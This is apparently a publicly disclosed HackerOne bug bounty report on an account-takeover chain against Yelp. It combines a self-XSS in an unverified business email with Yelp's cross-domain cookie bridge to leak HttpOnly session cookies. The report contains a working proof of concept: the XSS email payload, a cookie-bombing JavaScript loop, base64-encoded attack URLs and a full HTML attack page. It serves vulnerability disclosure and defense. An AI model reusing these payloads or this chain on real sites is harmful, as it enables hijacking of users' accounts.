# yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge

## Report Details
- **Report ID**: 2089042
- **URL**: https://hackerone.com/reports/2089042
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-07-28T23:12:10.305Z
- **Disclosed**: 2023-09-08T07:22:23.705Z

## Reporter
- **Username**: lil_endian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
# Summary
I've found an XSS on `biz.yelp.com` where the unverified email will be reflected in a message, prompting the user to verify the email. This XSS can be combined with the cookie bridge functionality to target other uses with the XSS. The XSS can then be combined with the cookie bridge a second time to leak `HttpOnly` session cookies, and makes account takeover possible for both business accounts and regular accounts.

# Description
## XSS in business user email
When a business user has not verified their email, a message is shown telling them to verify the email. The users email is reflected in this message, and it's possible to choose an email that will result in XSS.
███████
There is a 64 char limit on the chosen email, but it's just enough to achieve arbitrary javascript execution by choosing the email
```
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
```
and putting the payload base64 encoded in the url fragment
{F2544129}
{F2544130}

At this point this is just a Self-XSS, but I'll show how this can be used to target other uses.

## yelp.com's Cookie Bridge
Yelp has local versions of the website, so a user requesting the site in danish, will be redirected to `yelp.dk` and a user requesting the site in german will be redirected to `yelp.de`. If a users is signed into `yelp.com` and wishes to change language to danish, they can't just be sent to `yelp.dk` without having to log in again since `yelp.com` and `yelp.dk` are 2 completely different domains in the eyes of the browser, and so the users session cookies can't be used for both domains.

To solve this challenge, Yelp has implemented a Cookie Bridge that works by sending a GET request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. The backend will take all the users cookies and save them, redirect them to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F` which will then set the same cookies for the `yelp.dk` domain. The value of the `cookie_fsid` is unique for our cookies, and can only be used to retrieve the cookies once. 

## Using the Cookie Bridge to sign other users into our account
We can use the Cookie bridge to sign a victim into our account. While signed into our account on `biz.yelp.com` we send a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. This will result in a `303` redirect to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F`. Instead of following the redirect we can have a victim visit the link, and they'll then be signed into our business user on `biz.yelp.dk`. We can even use the `redir` parameter to redirect the victim to `/home#[OUR BASE64 ENCODED XSS PAYLOAD]` and have the XSS trigger

## Using the XSS for ATO
The situation is as follows: The victim is logged in on `biz.yelp.com`. We sign the victim into the attacker account on `biz.yelp.dk` where our XSS triggers. The XSS can't make any changes to the victim account due to `biz.yelp.com` and `biz.yelp.dk` being different domains. For the XSS to be effective we need to sign the victim account into `biz.yelp.dk`
The attack looks like this:
- Victim is logged into `biz.yelp.com`.
- The victim clicks on our page, which open a new tab. We'll call the opener tab "Tab A" and the new tab "Tab B". Tab B will load the cookie bridge retrieve endpoint that signs the victim into our attacker account on `biz.yelp.dk`, and triggers the XSS:
```
https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=/home/%23[XSS PAYLOAD BASE64 ENCODED]
```
- Now we have javascript execution in Tab B. We now get a reference to Tab A and redirects it via `window.opener.location.href = "https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"`. This will sign the victim into their own account on `biz.yelp.dk`. But our XSS is still alive in Tab B so we can now make requests from `biz.yelp.dk` with the victims session cookies.

At this point we're turned what started as a Self-XSS into regular XSS in the victims session. But we can improve the attack to steal the session cookies of the victims account, even though they're marked `HttpOnly` and not available from javascript. To do this we change the last step above and do the following instead:
- Using our XSS in Tab B we set several large cookies on `biz.yelp.dk` for the path `/cookie_bridge/retrieve`.:
```javascript
for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
```
this will make all requests to `https://biz.yelp.dk/cookie_bridge/retrieve` fail, as openresty will complain that the cookie is too large. This will prevent the `cookie_fsid` token from being consumed:
{F2544131}

- We now point Tab A to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` which will attempt to transfer the victim account cookies to `biz.yelp.dk`, but will end up failing with a 400 error page since the cookie header is too large.
- Now Tab B can access Tab A's location via `window.opener.location.href` since they share the same origin `biz.yelp.dk`. Tab B can now leak the retrieve url for the victims session cookies, and the attacker can simply visit this url to be signed in as the victim. This works for both business accounts and regular yelp accounts.

# POC and video
We create a business account with the email `"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh` without verifying it to get the Self-XSS gadget we need.

Using this account we make a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK&redir=/home/%23Zm9yICh2YXIgaSA9IDA7IGkgPCAxNjsgaSsrKSB7ZG9jdW1lbnQuY29va2llID0gYFgke2l9PSR7J1gnLnJlcGVhdCgxMDAwKX07IG1heC1hZ2U9ODY0MDA7IHBhdGg9L2Nvb2tpZV9icmlkZ2UvcmV0cmlldmVgfQp3aW5kb3cub3BlbmVyLnBvc3RNZXNzYWdlKHtyZWRpcmVjdDoiaHR0cHM6Ly9iaXoueWVscC5jb20vY29va2llX2JyaWRnZS9zdG9yZT9kaGw9ZGFfREsifSwgIioiKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHthbGVydCgiYXR0YWNrZXIgY2FuIG5vdyBzaWduIGluIGFzIHZpY3RpbSBieSBnb2luZyB0bzoiICsgd2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmKX0sIDUwMDApOw%3D%3D` which returns a 303 redirect to
`https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=cZ1U9eNTN2is8YaF4pCBWA&redir=%2Fhome%2F%23Zm9yICh2YXIgaSA9IDA7IGkgPCAxNjsgaSsrKSB7ZG9jdW1lbnQuY29va2llID0gYFgke2l9PSR7J1gnLnJlcGVhdCgxMDAwKX07IG1heC1hZ2U9ODY0MDA7IHBhdGg9L2Nvb2tpZV9icmlkZ2UvcmV0cmlldmVgfQp3aW5kb3cub3BlbmVyLnBvc3RNZXNzYWdlKHtyZWRpcmVjdDoiaHR0cHM6Ly9iaXoueWVscC5jb20vY29va2llX2JyaWRnZS9zdG9yZT9kaGw9ZGFfREsifSwgIioiKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHthbGVydCgiYXR0YWNrZXIgY2FuIG5vdyBzaWduIGluIGFzIHZpY3RpbSBieSBnb2luZyB0bzoiICsgd2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmKX0sIDUwMDApOw%3D%3D`.
{F2544134}

Getting this URL can obviously be automated, but for this POC we're just getting it manually and giving it as an argument to our POC HTML attack page. The attacker page looks like this:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>yelp xss poc</title>
  <script>
    function openTarget() {
      t = document.location.hash.substring(1);
      window.target = window.open(t);
    }

    // register a postmessage listener
    window.addEventListener('message', function (e) {
      console.log(e);
      if (e.data && e.data.redirect) {
        location.href = e.data.redirect; // this is vulnerable to xss but idc
      }
    });

  </script>
</head>
<body>
  <h1>Yelp.com account takeover POC</h1>
  <button onclick="openTarget()">click here to start attack</button>
</body>
</html>

```
and is hosted here: `https://calc.sh/yelp-poc-bah7ooli.html`.
When the victim clicks our link in their browser they'll be signed in to our attacker account and the XSS payload will run. The payload is base64 encoded and the decoded payload looks like this:
```javascript
for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
window.opener.postMessage({redirect:"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"}, "*");
setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
```
This code will set 16 large cookies each containing 1000 'X' chars. This will be enough to trigger the 400 error. After setting the cookies we find the opener tab, and send a postMessage asking it to redirect to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` (_I'm using postMessage to do the redirect so that the attack also works in Firefox. In Chrome we could simply set `window.opener.location.href`, but that doesn't work in Firefox for some reason_). The browser will be redirected to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=[FSID VALUE]` but will trigger the 400 error such that the `cookie_fsid` won't be consumed. The last line in our payload can now read the href of the opener window as they share the same origin, and we show the url in an alert box to demonstrate the attacker now has the url and can sign in as the victim.

This video shows the attack explained above, and demonstrates that the attacker is able to take over both a normal yelp account and a business account.
{F2544137}

## Impact

An attacker can leak the session cookies of a victim even though they're set as HttpOnly and sign in to the victims account. This works for both normal accounts and business accounts.

## Attachments
- 2023-07-28-161149_1206x805_scrot.png
- 2023-07-28-161210_1202x803_scrot.png
- 2023-07-28-170955_1204x418_scrot.png
- 2023-07-28-172439_1624x1193_scrot.png
- biz.yelp-yelp-ato-poc.mp4
